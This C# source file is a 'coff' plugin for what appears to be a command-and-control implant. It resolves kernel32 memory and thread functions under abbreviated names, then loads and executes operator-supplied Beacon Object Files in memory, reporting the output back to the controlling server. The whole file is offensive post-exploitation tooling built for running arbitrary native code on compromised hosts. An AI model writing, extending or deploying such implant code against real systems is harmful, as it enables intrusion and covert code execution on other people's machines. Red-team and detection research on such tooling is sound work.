using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using Invoker.Dynamic;
namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "coff";
        private IDataBroker messageManager { get; set; }
        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                List<string> k32funcs = new List<string>()
                {
                    "va",
                    "vf",
                    "gph",
                    "ha",
                    "zm",
                    "hf",
                    "ll",
                    "gpa",
                    "ct",
                    "gect",
                    "wfso",
                    "vp",
                };

                DebugLog.Log($"{Name} resolving k32 functions [{job.task.id}]");
                if (!Resolver.TryResolveFuncs(k32funcs, "k32", out var err)){
                    DebugLog.Log($"{Name} failed to resolve k32 functions: {err} [{job.task.id}]");
                    messageManager.WriteLine(err, job.task.id, true, "error");
                }

                DebugLog.Log($"{Name} loading BOF [{job.task.id}]");
                BofRunner br = new BofRunner(args);
                br.LoadBof();

                DebugLog.Log($"{Name} running BOF [{job.task.id}]");
                BofRunnerOutput bro = br.RunBof(60);
                messageManager.Write(bro.Output + Environment.NewLine + $"Exit Code: {bro.ExitCode}", job.task.id, true);
                DebugLog.Log($"{Name} completed with exit code {bro.ExitCode} [{job.task.id}]");
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error [{job.task.id}]: {e.Message}");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
